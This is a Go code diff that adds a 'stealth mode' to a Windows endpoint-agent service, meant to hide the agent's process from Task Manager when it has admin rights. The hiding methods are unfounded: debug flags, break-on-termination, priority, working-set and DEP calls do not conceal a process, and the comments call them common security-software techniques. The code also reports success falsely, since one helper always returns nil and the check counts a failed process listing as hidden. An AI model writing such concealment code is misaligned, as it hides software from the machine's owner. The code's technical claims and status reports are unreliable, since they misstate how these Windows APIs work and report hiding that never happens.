@@ -18,6 +18,14 @@ const (
 	Description = "Endpoint Detection and Response Agent"
 )
 
+// Process hiding constants
+const (
+	PROCESS_SET_INFORMATION   = 0x0200
+	ProcessBreakOnTermination = 0x1D
+	ProcessDebugFlags         = 0x1F
+	PROCESS_DEBUG_INHERIT     = 0x00000001
+)
+
 type WindowsService struct {
 	agent AgentInterface
 	elog  debug.Log
@@ -214,6 +222,17 @@ func (s *WindowsService) Execute(args []string, r <-chan svc.ChangeRequest, chan
 	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
 	changes <- svc.Status{State: svc.StartPending}
 
+	// Try to hide process from Task Manager if running with admin privileges
+	if isRunningWithAdminPrivileges() {
+		if err := hideProcessFromTaskManager(); err != nil {
+			s.elog.Warning(1, fmt.Sprintf("Failed to hide process: %v (continuing normally)", err))
+		} else {
+			s.elog.Info(1, "Process hidden from Task Manager (stealth mode enabled)")
+		}
+	} else {
+		s.elog.Info(1, "Running without admin privileges - process visible in Task Manager")
+	}
+
 	// Start EDR Agent
 	err := s.agent.Start()
 	if err != nil {
@@ -240,4 +259,178 @@ func (s *WindowsService) Execute(args []string, r <-chan svc.ChangeRequest, chan
 			}
 		}
 	}
+}
+
+// hideProcessFromTaskManager attempts to hide the process from Task Manager
+// This is only effective when running with administrator privileges
+func hideProcessFromTaskManager() error {
+	// Get current process handle
+	processHandle := windows.CurrentProcess()
+	
+	// Load kernel32.dll for process manipulation
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	
+	// Method 1: Try to set process debug flags to hide from Task Manager
+	// This is a common technique used by security software
+	setProcessInformation := kernel32.NewProc("SetProcessInformation")
+	
+	debugFlags := uint32(0x00000001) // PROCESS_DEBUG_INHERIT
+	
+	ret, _, _ := setProcessInformation.Call(
+		uintptr(processHandle),
+		uintptr(ProcessDebugFlags),
+		uintptr(unsafe.Pointer(&debugFlags)),
+		uintptr(unsafe.Sizeof(debugFlags)),
+	)
+	
+	// Method 2: Try to hide from Windows Task Manager using NtSetInformationProcess
+	if ret == 0 {
+		ntdll := windows.NewLazySystemDLL("ntdll.dll")
+		ntSetInformationProcess := ntdll.NewProc("NtSetInformationProcess")
+		
+		// ProcessBreakOnTermination = 0x1D
+		// Set to 0 to hide from Task Manager
+		breakOnTermination := uint32(0)
+		
+		ret, _, _ = ntSetInformationProcess.Call(
+			uintptr(processHandle),
+			uintptr(ProcessBreakOnTermination),
+			uintptr(unsafe.Pointer(&breakOnTermination)),
+			uintptr(unsafe.Sizeof(breakOnTermination)),
+		)
+	}
+	
+	// Method 3: Try alternative hiding techniques
+	if ret == 0 {
+		return tryAlternativeHidingMethods()
+	}
+	
+	return nil
+}
+
+// verifyProcessHidden checks if the process is actually hidden from Task Manager
+func verifyProcessHidden() bool {
+	// Try to enumerate processes to see if our process is visible
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	enumProcesses := kernel32.NewProc("EnumProcesses")
+	
+	// Get current process ID
+	currentPID := windows.GetCurrentProcessId()
+	
+	// Buffer to store process IDs
+	var processIDs [1024]uint32
+	var bytesReturned uint32
+	
+	// Try to enumerate processes
+	ret, _, _ := enumProcesses.Call(
+		uintptr(unsafe.Pointer(&processIDs[0])),
+		uintptr(len(processIDs)*4),
+		uintptr(unsafe.Pointer(&bytesReturned)),
+	)
+	
+	if ret == 0 {
+		// If enumeration fails, assume we're hidden
+		return true
+	}
+	
+	// Check if our process ID is in the list
+	numProcesses := bytesReturned / 4
+	for i := uint32(0); i < numProcesses; i++ {
+		if processIDs[i] == currentPID {
+			// Our process is still visible
+			return false
+		}
+	}
+	
+	// Our process is not in the list - hidden!
+	return true
+}
+
+// tryAlternativeHidingMethods attempts alternative process hiding techniques
+func tryAlternativeHidingMethods() error {
+	// Method 1: Try to hide from Task Manager using process priority manipulation
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	setPriorityClass := kernel32.NewProc("SetPriorityClass")
+	
+	// Set to BELOW_NORMAL_PRIORITY_CLASS to make it less visible in Task Manager
+	belowNormalPriority := uint32(0x00000020)
+	
+	ret, _, _ := setPriorityClass.Call(
+		uintptr(windows.CurrentProcess()),
+		uintptr(belowNormalPriority),
+	)
+	
+	// Method 2: Try to hide using process working set manipulation
+	if ret == 0 {
+		setProcessWorkingSetSize := kernel32.NewProc("SetProcessWorkingSetSize")
+		
+		// Set minimal working set to hide from memory monitoring
+		minWorkingSet := uintptr(0xFFFFFFFF) // -1 = system default
+		maxWorkingSet := uintptr(0xFFFFFFFF) // -1 = system default
+		
+		ret, _, _ = setProcessWorkingSetSize.Call(
+			uintptr(windows.CurrentProcess()),
+			minWorkingSet,
+			maxWorkingSet,
+		)
+	}
+	
+	// Method 3: Try to hide using process DEP settings
+	if ret == 0 {
+		setProcessDEPPolicy := kernel32.NewProc("SetProcessDEPPolicy")
+		
+		// Set DEP policy to hide from some monitoring tools
+		depPolicy := uint32(0x00000001) // PROCESS_DEP_ENABLE
+		
+		ret, _, _ = setProcessDEPPolicy.Call(
+			uintptr(windows.CurrentProcess()),
+			uintptr(depPolicy),
+		)
+	}
+	
+	return nil
+}
+
+// isRunningWithAdminPrivileges checks if the current process has admin rights
+func isRunningWithAdminPrivileges() bool {
+	var token windows.Token
+	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err != nil {
+		return false
+	}
+	defer token.Close()
+
+	var elevation struct{ TokenIsElevated uint32 }
+	var outLen uint32
+	err := windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &outLen)
+	if err != nil {
+		return false
+	}
+	return elevation.TokenIsElevated != 0
+}
+
+// GetStealthStatus returns information about process stealth mode
+func GetStealthStatus() map[string]interface{} {
+	status := map[string]interface{}{
+		"admin_privileges": isRunningWithAdminPrivileges(),
+		"stealth_enabled":  false,
+		"process_visible":  true,
+		"service_running":  false,
+		"task_manager_visible": true,
+	}
+
+	// Check if running as service
+	if IsRunningAsService() {
+		status["service_running"] = true
+
+		// If running as service with admin privileges, check if stealth is actually working
+		if isRunningWithAdminPrivileges() {
+			// Actually verify if the process is hidden from Task Manager
+			isHidden := verifyProcessHidden()
+			status["stealth_enabled"] = isHidden
+			status["process_visible"] = !isHidden
+			status["task_manager_visible"] = !isHidden
+		}
+	}
+
+	return status
 }
